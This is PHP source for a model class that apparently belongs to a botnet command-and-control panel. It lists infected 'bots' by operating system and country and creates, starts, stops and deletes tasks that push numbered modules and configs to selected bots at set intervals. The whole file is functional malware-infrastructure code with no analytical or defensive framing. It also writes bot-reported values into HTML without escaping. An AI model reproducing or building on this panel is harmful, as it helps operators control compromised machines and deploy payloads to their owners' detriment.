<?php

class Model_Modules_Tasks extends Model
{

    public function get_data(){ }

    public function getTasks()
    {
        $tasks_array = $this->getDB()->queryRows('SELECT * FROM modules_tasks ORDER BY id DESC');
        if (!empty($tasks_array))
        {
            for($pos = 0, $posMax = count($tasks_array); $pos < $posMax; ++$pos)
            {
                $tasks_array[$pos]['module_name'] = $this->getModuleNameForId($tasks_array[$pos]['module_id']);
                $tasks_array[$pos]['config_name'] = $this->getConfigNameForId($tasks_array[$pos]['config_id']);
            }
            return $tasks_array;
        }
        return NULL;
    }

    private function getModuleNameForId($module_id)
    {
        $name = $this->getDB()->queryValue('SELECT name FROM modules WHERE id = :module_id',
            array(':module_id' => $module_id));
        return $name;
    }

    private function getConfigNameForId($config_id)
    {
        $name = $this->getDB()->queryValue('SELECT name FROM modules_configs WHERE id = :config_id',
            array(':config_id' => $config_id));
        return $name;
    }

    function getTasksOptions()
    {
        // tasks
        $select_os = $this->getOptionsData('os');
        $select_contry = $this->getOptionsData('country');
        return array('select_os' => $select_os, 'select_country' => $select_contry);
    }

    private function getOptionsData($column)
    {
        $result='';
        $data = $this->getDB()->queryRows('SELECT distinct '.$column.' FROM bots');

        foreach($data as $data_new)
        {
            $data_new[$column] = (!empty($data_new[$column])) ? $data_new[$column] : 'Unknown';
            $result.='<option value="'.$data_new[$column].'">'.$data_new[$column].'</option>';
        }
        return $result;
    }

    public function createTask()
    {
        if ($this->taskInfoIsCorrect())
        {
            $new_task = new Task(json_encode($this->request_data['os']), json_encode($this->request_data['country']),
                $this->request_data['interval'], $this->request_data['module_id'], $this->request_data['context'],
                (!empty($this->request_data['flags']) || $this->request_data['flags'] == 0) ? $this->request_data['flags'] : 0,
                (!empty($this->request_data['config_id']) || $this->request_data['config_id'] == 0) ? $this->request_data['config_id'] : 0);

            $task_id = $this->getDB()->insert('modules_tasks', (array)$new_task);

            if ($task_id > 0)
            {
                return true;
            }
        }
        return false;
    }

    public function updateTask()
    {
        if(!empty($this->request_data['task_id']) && !empty($this->request_data['action']))
        {
            $resp = '';
            switch($this->request_data['action'])
            {
                case 'delete':
                    $this->getDB()->sql('DELETE FROM modules_tasks WHERE id=:id', array(':id' => $this->request_data['task_id']));
                    break;
                case 'start':
                    $this->getDB()->update('modules_tasks', array('status' => 0), 'id=:id', array(':id' => $this->request_data['task_id']));
                    break;
                case 'stop':
                    $this->getDB()->update('modules_tasks', array('status' => 1), 'id=:id', array(':id' => $this->request_data['task_id']));
                    break;
            }
            return true;
        }
        return false;
    }

    private function taskInfoIsCorrect()
    {
        if ((!empty($this->request_data['interval']) || $this->request_data['interval'] == 0) && !empty($this->request_data['module_id']) &&
            !empty($this->request_data['os']) && !empty($this->request_data['country']) &&
            (!empty($this->request_data['flags']) || $this->request_data['flags'] == 0) && !empty($this->request_data['context']) &&
            (!empty($this->request_data['config_id']) || $this->request_data['config_id'] == 0))
        {
            return true;
        }
        return false;
    }

}

class Task
{
    public $time;
    public $os;
    public $country;
    public $execute_interval;
    public $module_id;
    public $context;
    public $flags;
    public $config_id;


    public function __construct($os, $country, $execute_interval, $module_id, $context, $flags = 0, $config_id = 0)
    {
        $this->os = $os;
        $this->country = $country;
        $this->execute_interval = $execute_interval;
        $this->module_id = $module_id;
        $this->context = $context;
        $this->flags = $flags;
        $this->config_id = $config_id;
        $this->time = time();
    }
}